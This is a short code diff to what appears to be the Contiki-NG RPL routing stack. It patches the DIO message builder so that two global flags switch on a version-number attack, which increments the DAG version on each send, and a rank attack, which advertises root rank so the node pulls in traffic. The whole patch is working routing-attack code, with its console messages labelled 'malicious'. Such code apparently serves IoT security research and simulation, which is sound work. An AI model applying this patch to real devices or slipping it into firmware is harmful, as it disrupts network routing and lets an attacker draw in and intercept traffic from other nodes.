@@ -352,13 +352,27 @@ rpl_icmp6_dio_output(uip_ipaddr_t *uc_addr)
 
   buffer = UIP_ICMP_PAYLOAD;
   buffer[pos++] = curr_instance.instance_id;
-  buffer[pos++] = curr_instance.dag.version;
+    
+    extern int version_attack;
+    if (version_attack) {
+        buffer[pos++] = ++curr_instance.dag.version;
+        printf("\nSenting 'malicious' DIO with version %u\n", curr_instance.dag.version);
+    } else {
+        buffer[pos++] = curr_instance.dag.version;
+    }
 
-  if(rpl_get_leaf_only()) {
-    set16(buffer, pos, RPL_INFINITE_RANK);
-  } else {
-    set16(buffer, pos, curr_instance.dag.rank);
-  }
+    extern int rank_attack;
+    if (rank_attack) {
+        set16(buffer, pos, ROOT_RANK);
+        printf("\nSenting 'malicious' DIO with rank %u\n", ROOT_RANK);
+    } else {
+        if(rpl_get_leaf_only()) {
+            set16(buffer, pos, RPL_INFINITE_RANK);
+        } else {
+            set16(buffer, pos, curr_instance.dag.rank);
+        }
+    }
+
   pos += 2;
 
   buffer[pos] = 0;
